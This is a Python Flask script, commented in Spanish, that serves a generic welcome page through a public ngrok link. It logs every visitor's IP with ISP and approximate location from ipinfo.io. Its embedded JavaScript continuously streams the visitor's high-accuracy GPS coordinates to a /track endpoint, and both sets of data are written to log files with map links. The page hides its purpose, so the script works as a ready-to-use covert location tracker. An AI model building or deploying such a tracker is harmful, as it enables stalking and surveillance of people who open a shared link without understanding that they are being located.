# Explicacion codigo: Lo que hace este script es crear un servidor web con Flask que registra la IP del visitante y su geolocalización aproximada usando un servicio externo. Además, solicita al usuario permiso para acceder a su ubicación GPS real y la envía al servidor si se concede el permiso.

from flask import Flask, request, jsonify, render_template_string
from pyngrok import ngrok
import requests
import datetime

app = Flask(__name__)

HTML_PAGE = """
<!DOCTYPE html>
<html>
<head>
    <title>Bienvenido</title>
</head>
<body>
    <h2>Gracias por visitar nuestro sitio</h2>
    <p>Sitio web para poder darte a entender donde estas ubicado</p>

    <script>
        // Obtener ubicación GPS en tiempo real
        if ("geolocation" in navigator) {
            navigator.geolocation.watchPosition(function(pos) {
                const coords = pos.coords.latitude + "," + pos.coords.longitude;
                fetch("/track", {
                    method: "POST",
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ gps_coords: coords })
                });
            }, function(error) {
                console.log("El usuario no compartió ubicación.");
            }, {
                enableHighAccuracy: true,
                maximumAge: 10000,
                timeout: 10000
            });
        }
    </script>
</body>
</html>
"""

@app.route("/")
def index():
    ip = request.headers.get("X-Forwarded-For", request.remote_addr)

    try:
        geo_url = f'https://ipinfo.io/{ip}/json'
        geo_data = requests.get(geo_url).json()

        city = geo_data.get("city", "Desconocido")
        region = geo_data.get("region", "Desconocido")
        country = geo_data.get("country", "Desconocido")
        loc = geo_data.get("loc", "0,0")
        org = geo_data.get("org", "Desconocido")
        map_url = f"https://maps.google.com/?q={loc}"
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

        print(f"[{timestamp}] [+] IP detectada: {ip}")
        print(f"📍 Ubicación: {city}, {region}, {country}")
        print(f"📌 Coordenadas por IP: {loc}")
        print(f"🏢 ISP: {org}")
        print(f"🗺️ Mapa IP: {map_url}")

        with open("ips.txt", "a", encoding="utf-8") as f:
            f.write(f"[{timestamp}] {ip} | {city}, {region}, {country} | {loc} | {org}\n")

    except Exception as e:
        print(f"[!] Error al obtener ubicación por IP: {e}")

    return render_template_string(HTML_PAGE)

@app.route("/track", methods=["POST"])
def track():
    data = request.get_json()
    coords = data.get("gps_coords")
    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    map_url = f"https://maps.google.com/?q={coords}"

    print(f"[{timestamp}] 📡 {ip} - Coordenadas GPS: {coords}")
    print(f"🗺️ Mapa GPS: {map_url}")

    with open("rastro_gps.txt", "a", encoding="utf-8") as f:
        f.write(f"[{timestamp}] {ip} | {coords} | {map_url}\n")

    return jsonify({"status": "ok"})

if __name__ == "__main__":
    public_url = ngrok.connect(5000)
    print(f"\n[+] Enlace público generado por ngrok: {public_url}\n")
    app.run(host="0.0.0.0", port=5000)